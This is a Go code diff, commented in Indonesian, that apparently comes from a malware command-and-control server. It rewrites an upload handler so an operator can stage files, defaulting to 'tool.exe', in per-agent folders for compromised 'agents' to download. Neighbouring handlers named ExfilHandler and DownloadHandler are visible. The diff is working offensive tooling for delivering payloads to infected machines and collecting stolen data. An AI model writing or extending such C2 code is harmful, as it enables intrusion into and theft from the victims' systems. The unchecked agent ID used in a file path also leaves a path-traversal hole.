@@ -145,10 +145,21 @@ func ExfilHandler(w http.ResponseWriter, r *http.Request) {
 
 // UploadHandler: Operator meng-upload file ke server
 func UploadHandler(w http.ResponseWriter, r *http.Request) {
-	filename := r.URL.Query().Get("filename")
-	if filename == "" {
-		http.Error(w, "Filename required", http.StatusBadRequest)
+	if r.Method != http.MethodPost {
+		http.Error(w, "POST method required", http.StatusMethodNotAllowed)
 		return
+	}
+
+	// Baca Agent ID dari form
+	agentID := r.FormValue("id")
+	if agentID == "" {
+		http.Error(w, "Agent ID required", http.StatusBadRequest)
+		return
+	}
+
+	filename := r.FormValue("filename")
+	if filename == "" {
+		filename = "tool.exe" // default
 	}
 
 	file, _, err := r.FormFile("file")
@@ -158,9 +169,12 @@ func UploadHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	defer file.Close()
 
-	os.MkdirAll("uploaded_files", 0755)
-	dstPath := filepath.Join("uploaded_files", filepath.Base(filename))
+	// Bikin subfolder per agent, misalnya:
+	uploadDir := filepath.Join("uploaded_files", agentID)
+	os.MkdirAll(uploadDir, 0755)
 
+	// Buat file
+	dstPath := filepath.Join(uploadDir, filepath.Base(filename))
 	dst, err := os.Create(dstPath)
 	if err != nil {
 		http.Error(w, "Failed to create file on server", http.StatusInternalServerError)
@@ -168,14 +182,15 @@ func UploadHandler(w http.ResponseWriter, r *http.Request) {
 	}
 	defer dst.Close()
 
+	// Salin isi file
 	_, err = io.Copy(dst, file)
 	if err != nil {
 		http.Error(w, "Failed to save file", http.StatusInternalServerError)
 		return
 	}
 
-	log.Printf("[+] File uploaded to: %s\n", dstPath)
-	fmt.Fprint(w, "File uploaded successfully")
+	log.Printf("[+] File uploaded for agent %s -> %s\n", agentID, dstPath)
+	fmt.Fprint(w, "File uploaded successfully for agent ", agentID)
 }
 
 // DownloadHandler: Agent mendownload file dari server
